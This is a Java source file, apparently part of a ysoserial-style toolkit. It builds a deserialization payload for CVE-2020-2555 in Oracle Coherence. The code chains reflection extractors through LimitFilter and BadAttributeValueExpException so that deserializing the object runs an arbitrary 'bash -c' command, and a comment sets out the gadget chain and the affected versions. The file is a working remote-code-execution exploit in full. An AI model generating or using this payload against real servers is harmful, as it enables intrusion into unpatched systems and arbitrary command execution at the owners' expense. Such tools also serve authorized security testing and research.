package payloads;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

// CVE-2020-2555

/*
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.util.extractor.ChainedExtractor.extract()
 *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
 *                      Method.invoke()
 *                      ...
 *                      Runtime.getRuntime.exec()
 */

@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0"})
@Authors({ Authors.CCKUAILONG })
public class Coherence1 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		ValueExtractor[] valueExtractors = new ValueExtractor[]{
				new ReflectionExtractor("getMethod", new Object[]{
						"getRuntime", new Class[0]
				}),
				new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
				new ReflectionExtractor("exec", new Object[]{new String[]{"bash", "-c", command}})
		};
		//初始化LimitFiler类实例
		LimitFilter limitFilter = new LimitFilter();
		limitFilter.setTopAnchor(Runtime.class);
		BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
		Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
		m_comparator.setAccessible(true);
		m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
		Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
		m_oAnchorTop.setAccessible(true);
		m_oAnchorTop.set(limitFilter, Runtime.class);
		//将limitFilter放入BadAttributeValueExpException的val属性中
		Field val = expException.getClass().getDeclaredField("val");
		val.setAccessible(true);
		val.set(expException, limitFilter);

		return expException;
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(Coherence1.class, command, fusion);
	}
}
